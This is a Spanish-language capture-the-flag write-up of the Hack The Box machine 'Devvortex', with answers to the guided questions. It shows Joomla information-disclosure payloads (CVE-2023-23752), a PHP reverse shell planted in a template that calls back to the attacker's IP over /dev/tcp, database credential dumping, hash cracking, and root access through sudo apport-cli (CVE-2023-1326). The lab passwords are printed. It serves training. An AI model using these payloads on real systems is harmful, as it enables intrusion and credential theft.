---
title: Writeup devvortex - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - devvortex
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina devvortexen Hack The Box.
keywords:
  - writeup devvortex
  - hack the box devvortex
  - resolución máquina devvortex
  - devvortex  hack the box
  - htb devvortex
---
----
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Devvortex)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=086byNlzslI)|[Parte2](https://www.youtube.com/watch?v=H22NxJNg3jA)|[Parte3](https://www.youtube.com/watch?v=sETUPHypClw)
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=Xo8z5oWp6PQ)

---

#easy #linux #nmap #ping #whatweb #wappalyzer #/etc/hosts #gobuster  #enumeracionversiondejoomla #CVE-2023-23752 #reverseshell #tratamientotty #inyecciondecodigophpentemplatejoomla #nc-nlvp443 #CVE-2023-1326 #abusobinarioapport-cli #sudo-l #john #mysql #ssh

-----
# Guided Mode

1)¿Cuántos puertos TCP abiertos escuchan en DevVortex?
	2

2)¿Qué subdominio está configurado en el servidor web de la destino?
	dev.devvortex.htb

3)¿Qué sistema de gestión de contenido (CMS) se ejecuta en dev.devvortex.htb?
	Joomla

4)¿Qué versión de Joomla se está ejecutando en el sistema de destino?
	4.2.6

5)¿Cuál es la ID de CVE 2023 para una vulnerabilidad de divulgación de información en la versión de Joomla que se ejecuta en DevVortex?
	CVE-2023-23752

6)¿Cuál es la contraseña del usuario de Lewis para el CMS?
	P4ntherg0t1n5r3c0n##

7)¿Qué tabla de la base de datos contiene credenciales de hash para el usuario de Logan?
	sd4fg_users

8)¿Cuál es la contraseña del usuario de Logan en DevVortex?
	tequieromucho

*La pregunta anterior es la flag de user.txt*
10)¿Cuál es la ruta completa al binario que el usuario de Logan puede ejecutar con privilegios raíz usando sudo?
	/usr/bin/apport-cli

11)¿Cuál es la identificación CVE 2023 de la vulnerabilidad de escalada de privilegios en la versión instalada de Apport-Cli?
	CVE-2023-1326
	
-------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.242
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.11.242 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.11.242 -oN targetTCP
nmap -sU --top-ports 200 -vvv -n -Pn 10.10.11.242 -oN targetUDP
```

![[Devvortex1.png]]

![[Devvortex2.png]]
![[Devvortex3.png]]

*TTL:* Maquina linux
*Puertos TCP:*
	`22` [[ssh]]
	`80` HTTP
*Puertos UDP:*
	Nada relevante

------
# Agregamos dominio al /etc/hosts

Entramos a la pagina y nos da el dominio devvortex.htb
![[Devvortex4.png]]
Asi que lo vamos a añadir con cualquier editor de texto a el archivo */etc/hosts*

```
10.10.11.242 devvortex.htb
```

![[Devvortex5.png]]

![[Devvortex6.png]]
Ya nos carga la pagina con normalidad

--------
# [[Whatweb-wappalyzer]]

```shell
http://devvortex.htb/
```

![[Devvortex7.png]]

![[Devvortex8.png]]
Nos da el mail info@devvortex.htb, y la version jquery 3.4.1

------
# [[Gobuster]]

```shell
gobuster vhost -u http://devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain
```
*Aclaracion:* En este escaneo en particular use 50 hilos y no 64, por que me tiraba errores de conexion muchas veces y incluso bajando los hilos todavia tiraba errores de conexion

Encontramos el subdominio dev.devvortex.htb
![[Devvortex10.png]]
Lo añadimos al archivo */etc/hosts*
```
10.10.11.242 dev.devvortex.htb
```
![[Devvortex9.png]]
Si entramos ahora a la pagina nos va a mostrar lo siguiente

![[Devvortex13.png]]

Y si ahora empezamos a enumerar directorios del subdominio
```shell
gobuster dir -u http://dev.devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 50 -add-slash
```

![[Devvortex12.png]]
Encontramos el directorio */administrator* que la url completa seria http://dev.devvortex.htb/administrator/

![[Devvortex11.png]]


------
# [[Enumeracion version de joomla]]

Buscando en internet encontramos que si vamos al endpoint http://dev.devvortex.htb/administrator/manifests/files/joomla.xml vamos a poder visualizar la version de joomla

![[Devvortex14.png]]
Nos dice que esta corriendo la *version 4.2.6* asi que vamos a usar el [[CVE-2023-23752]]

-----
# [[CVE-2023-23752]]

Guiandonos del repositorio de [Youns92](https://github.com/Youns92/Joomla-v4.2.8---CVE-2023-23752)
Usamos estos payloads para sacar informacion:

```shell
curl -s "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq '.data[] | select(.type == "users") | {id: .attributes.id, name: .attributes.name, username: .attributes.username, email: .attributes.email, groups: .attributes.group_names}'
```

![[Devvortex15.png]]
Este no nos da ninguna informacion relevante

Y este otro payload si nos da informacion que nos sirve

```shell
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq '.data[] | select(.type == "application") | .attributes'
```


![[Devvortex16.png]]
![[Devvortex17.png]]

Obtenemos las credenciales:
lewis:P4ntherg0t1n5r3c0n##

Y ahora entramos al panel de logeo con las credenciales que dumpeamos

![[Devvortex18.png]]

------------
# [[Inyeccion de codigo php en template Joomla]] para enviarnos una [[Reverse shell]] 

Aca apretamos en *System*

![[Devvortex19.png]]
Ahora en *Site Templates*
![[Devvortex20.png]]

Y vamos a cambiar el contenido del error.php por el siguiente 

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.15/443 0>&1'");
?>
```

![[Devvortex21.png]]
Y ahora mientras estamos en escucha con [[nc -nlvp 443]] vamos entrar al siguiente link para que se ejecute el *error.php* http://dev.devvortex.htb/templates/cassiopeia/error.php
![[Devvortex22.png]]
Obtuvimos acceso como www-data

------
# [[Tratamiento de la TTY]]

--------
# Escalada de privilegios al usuario logan

###  Conexion a [[mysql]]
Nos conectamos a la base de datos [[mysql]] con las credenciales que habiamos obtenido antes con los payloads de joomla
lewis:P4ntherg0t1n5r3c0n##

```
mysql -u lewis -p"P4ntherg0t1n5r3c0n##" -h localhost -P 3306
```

### Para dumpear los datos

```shell
show databases;
use joomla;
show tables;
select * from sd4fg_users;
```

![[Devvortex26.png]]

![[Devvortex27.png]]
![[Devvortex28.png]]

![[Devvortex24.png]]

Y dumpeamos los datos `logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`

### Crackeamos contraseña con [[john]]

Primero vamos a poner el hash en un archivo con [[nvim]] usando el comando nvim test.txt
Y luego con el comando `john test.txt -w=/usr/share/wordlists/rockyou.txt` nos da la contraseña *tequieromucho*

![[Devvortex25.png]]

### Conexion por [[ssh]]

Nos vamos a conectar a [[ssh]] con el comando `ssh logan@10.10.11.242 -p 22` y vamos a proporcionar la contraseña *tequiermucho*

![[Devvortex29.png]]
Ya estamos dentro como el usuario *logan*

-------
# [[Tratamiento de la TTY]]

-------
# Escalada al usuario root con [[Abuso de Sudo]] [[Binario apport-cli]] y [[CVE-2023-1326]]

```shell
sudo -l
```
![[Devvortex30.png]]
Nos indica que todos pueden usar el binario apport-cli sin proporcionar contraseña
Usamos el comando `apport-cli -v` para ver la version y vemos que es la *2.20.11*
![[Devvortex35.png]]

Viendo el [siguiente articulo sobre CVE-2023-1326 hecho por diego-tella](https://github.com/diego-tella/CVE-2023-1326-PoC) tenemos este CVE para la version 2.26.0, asi que como tenemos una version mas vieja, vamos a probar ejecutar lo mismo

Vemos que si ejecutamos el binario de la siguiente forma``sudo /usr/bin/apport-cli /bin/bash`

![[Devvortex31.png]]
Luego cuando nos pide que queremos hacer, ponemos la *v* que es para ver el reporte
Y vamos a poner *!/bin/bash* para que se nos abra una shell con los permisos de root
![[Devvortex32.png]]
Ya ganamos acceso como root y podemos catear las flags
![[Devvortex34.png]]

----------
# Creditos

Writeup oficial HackTheBox
[Writeup de Sam](https://infosecwriteups.com/devvortex-hackthebox-walkthrough-6b6cbf8df1eb)